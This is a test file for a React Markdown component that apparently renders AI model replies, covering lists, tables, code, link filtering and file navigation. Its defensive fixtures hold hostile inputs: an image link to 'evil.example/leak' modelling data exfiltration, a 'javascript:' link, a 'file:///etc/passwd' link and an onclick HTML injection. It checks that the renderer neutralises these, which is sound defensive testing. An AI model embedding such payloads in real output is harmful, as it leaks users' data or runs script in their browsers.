import { cleanup, fireEvent, render, screen } from '@testing-library/react';
import { afterEach, describe, expect, it, vi } from 'vitest';

import { FileNavigationProvider } from '@/shared/files';
import { LocaleProvider } from '@/shared/i18n';

import { Markdown } from './Markdown';

const draw = (text: string, streaming = false) =>
  render(
    <LocaleProvider locale="ko">
      <Markdown text={text} streaming={streaming} />
    </LocaleProvider>,
  ).container;

describe('Markdown', () => {
  afterEach(cleanup);

  it('draws lists, tables and code in our elements', () => {
    const container = draw(
      '- 하나\n- 둘\n\n| 파일 | 바뀐 것 |\n|---|---|\n| a.ts | 고침 |\n\n```ts\nconst a = 1;\n```',
    );
    expect(container.querySelectorAll('li')).toHaveLength(2);
    expect(screen.getByRole('table')).toBeTruthy();
    expect(screen.getByText('ts')).toBeTruthy();
    expect(container.querySelector('pre')?.textContent).toBe('const a = 1;');
  });

  it('keeps HTML the model wrote as text', () => {
    const container = draw('버튼은 <button onclick="x()">여기</button> 이렇게 써요');
    expect(container.querySelector('button[onclick]')).toBeNull();
    expect(container.querySelector('script, iframe')).toBeNull();
    expect(container.textContent).toContain('<button onclick="x()">여기</button>');
  });

  it('never loads an image, and offers it as a link instead', () => {
    const container = draw('![비밀](https://evil.example/leak?d=abc)');
    expect(container.querySelector('img')).toBeNull();
    expect(screen.getByRole('link', { name: '이미지: 비밀' }).getAttribute('href')).toBe(
      'https://evil.example/leak?d=abc',
    );
  });

  it('makes links only of web pages and mail', () => {
    draw('[문서](https://example.com) [파일](file:///etc/passwd) [스크립트](javascript:alert(1))');
    expect(screen.getAllByRole('link').map((a) => a.textContent)).toEqual(['문서']);
    expect(screen.getByText('파일')).toBeTruthy();
  });

  it('opens local markdown and inline-code source references through workspace navigation', () => {
    const opened = vi.fn();
    render(
      <LocaleProvider locale="ko">
        <FileNavigationProvider cwd="/project" onOpen={opened}>
          <Markdown text={'[소스](/project/src/a.ts:42) `src/b.ts:8`'} streaming={false} />
        </FileNavigationProvider>
      </LocaleProvider>,
    );
    fireEvent.click(screen.getByRole('button', { name: '소스' }));
    fireEvent.click(screen.getByRole('button', { name: 'src/b.ts:8' }));
    expect(opened).toHaveBeenCalledTimes(2);
  });

  it('closes what is still open while streaming', () => {
    const container = draw('**굵게 쓰는 중', true);
    expect(container.textContent).not.toContain('**');
  });
});
